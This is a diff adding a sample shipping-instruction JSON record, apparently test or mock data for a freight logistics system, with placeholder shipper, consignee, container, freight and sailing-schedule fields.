@@ -14458,5 +15433,207 @@
       "reassignedToBranchId": "EGYSHP100"
     },
     "tenantId": 728
+  },
+  "SI" : {
+    "additionalParties": [
+      {
+        "addressCode": "ADDR123",
+        "addressData": {
+          "street": "123 Market Street",
+          "city": "San Francisco",
+          "state": "CA",
+          "zip": "94105"
+        },
+        "addressId": "ADDR001",
+        "countryCode": "US",
+        "entityId": 101,
+        "entityType": "CUSTOMER",
+        "guid": "123e4567-e89b-12d3-a456-426614174000",
+        "isAddressFreeText": false,
+        "orgCode": "ORG123",
+        "orgData": {
+          "name": "Extra Logistics Partner"
+        },
+        "orgId": "ORG001",
+        "tenantId": 1,
+        "type": "NotifyParty"
+      }
+    ],
+    "blComments": "Handle with care. Temperature controlled shipment.",
+    "carrierBlNo": "CBL789456",
+    "carrierBookingNo": "CBN123456",
+    "commonContainers": [
+      {
+        "carrierBookingId": 101,
+        "commodityCode": "FRT-001",
+        "containerCode": "C20",
+        "containerNo": "CONT1234567",
+        "count": 1,
+        "goodsDescription": "Electronics",
+        "grossWeight": 10000,
+        "grossWeightUnit": "KG",
+        "hsCode": "847130",
+        "netWeight": 9500,
+        "netWeightUnit": "KG",
+        "packs": 100,
+        "packsUnit": "CTN",
+        "sealNumber": "SEAL12345",
+        "shippingInstructionId": 501,
+        "tareWeight": 500,
+        "tareWeightUnit": "KG",
+        "volume": 25,
+        "volumeUnit": "CBM"
+      }
+    ],
+    "commonPackages": [
+      {
+        "commodityDescription": "Consumer Electronics",
+        "containerNo": "CONT1234567",
+        "goodsDescription": "Laptops and Tablets",
+        "grossWeight": 2000,
+        "grossWeightUnit": "KG",
+        "hsCode": "847130",
+        "packs": 20,
+        "packsUnit": "CTN",
+        "shippingInstructionId": 501,
+        "volume": 5,
+        "volumeUnit": "CBM"
+      }
+    ],
+    "consignee": {
+      "addressCode": "ADDR456",
+      "addressData": {
+        "street": "456 Ocean Drive",
+        "city": "Miami",
+        "state": "FL",
+        "zip": "33101"
+      },
+      "addressId": "ADDR002",
+      "countryCode": "US",
+      "entityId": 130,
+      "entityType": "CONSIGNEE",
+      "guid": "123e4567-e89b-12d3-a456-426614174000",
+      "isAddressFreeText": false,
+      "orgCode": "ORG456",
+      "orgData": {
+        "name": "ABC Imports LLC"
+      },
+      "orgId": "ORG002",
+      "tenantId": 1,
+      "type": "Consignee"
+    },
+    "contract": {
+      "addressCode": "ADDR789",
+      "addressData": {
+        "street": "789 Shipping Lane",
+        "city": "Los Angeles",
+        "state": "CA",
+        "zip": "90001"
+      },
+      "addressId": "ADDR003",
+      "countryCode": "US",
+      "entityId": 130,
+      "entityType": "CONTRACT",
+      "guid": "123e4567-e89b-12d3-a456-426614174000",
+      "isAddressFreeText": false,
+      "orgCode": "ORG789",
+      "orgData": {
+        "name": "XYZ Logistics"
+      },
+      "orgId": "ORG003",
+      "tenantId": 1,
+      "type": "Contract"
+    },
+    "entityId": 501,
+    "entityNumber": "ENT123456",
+    "entityType": "CONSOLIDATION",
+    "forwardingAgent": {
+      "addressCode": "ADDR321",
+      "addressData": {
+        "street": "321 Export Blvd",
+        "city": "Houston",
+        "state": "TX",
+        "zip": "77001"
+      },
+      "addressId": "ADDR004",
+      "countryCode": "US",
+      "entityId": 130,
+      "entityType": "FORWARDER",
+      "guid": "123e4567-e89b-12d3-a456-426614174000",
+      "isAddressFreeText": false,
+      "orgCode": "ORG321",
+      "orgData": {
+        "name": "Global Forwarders Inc."
+      },
+      "orgId": "ORG004",
+      "tenantId": 1,
+      "type": "Forwarder"
+    },
+    "freightDetails": [
+      {
+        "chargeType": "Freight",
+        "payerLocation": "Houston, TX",
+        "payerType": "SHIPPER",
+        "paymentTerms": "PREPAID",
+        "shippingInstructionId": 501
+      }
+    ],
+    "noOfFreightCopies": 2,
+    "noOfUnFreightCopies": 1,
+    "nonNegoFreightCopies": 1,
+    "nonNegoUnFreightCopies": 0,
+    "referenceNumberRequests": [
+      {
+        "carrierBookingId": 101,
+        "referenceNumber": "REF12345",
+        "shippingInstructionId": 501,
+        "type": "BookingRef"
+      }
+    ],
+    "sailingInformationRequest": {
+      "carrier": "Maersk",
+      "carrierDeliveryPlace": "Rotterdam Port",
+      "carrierReceiptPlace": "Los Angeles Port",
+      "earliestDepartureDate": "2025-09-10T08:00:00Z",
+      "emptyContainerPickupCutoff": "2025-09-08T12:00:00Z",
+      "eta": "2025-09-20T15:00:00Z",
+      "etd": "2025-09-10T08:00:00Z",
+      "hazardousBookingCutoff": "2025-09-07T18:00:00Z",
+      "lastUpdatedSailingInfo": "2025-09-04T10:55:17.139Z",
+      "latestDeliveryDate": "2025-09-09T17:00:00Z",
+      "loadedContainerGateInCutoff": "2025-09-08T20:00:00Z",
+      "pod": "NLRTM",
+      "pol": "USLAX",
+      "reeferCutoff": "2025-09-07T23:00:00Z",
+      "shipInstructionCutoff": "2025-09-06T20:00:00Z",
+      "terminalCutoff": "2025-09-09T22:00:00Z",
+      "verifiedGrossMassCutoff": "2025-09-07T12:00:00Z",
+      "vesselName": "MSC Harmony",
+      "voyageNo": "VOY123"
+    },
+    "shipper": {
+      "addressCode": "ADDR999",
+      "addressData": {
+        "street": "999 Export Road",
+        "city": "Dallas",
+        "state": "TX",
+        "zip": "75201"
+      },
+      "addressId": "ADDR005",
+      "countryCode": "US",
+      "entityId": 749681,
+      "entityType": "SHIPPER",
+      "guid": "123e4567-e89b-12d3-a456-426614174000",
+      "isAddressFreeText": false,
+      "orgCode": "ORG999",
+      "orgData": {
+        "name": "Tech Exporters Ltd."
+      },
+      "orgId": "ORG005",
+      "tenantId": 1,
+      "type": "Shipper"
+    },
+    "status": "Draft"
   }
+
 }
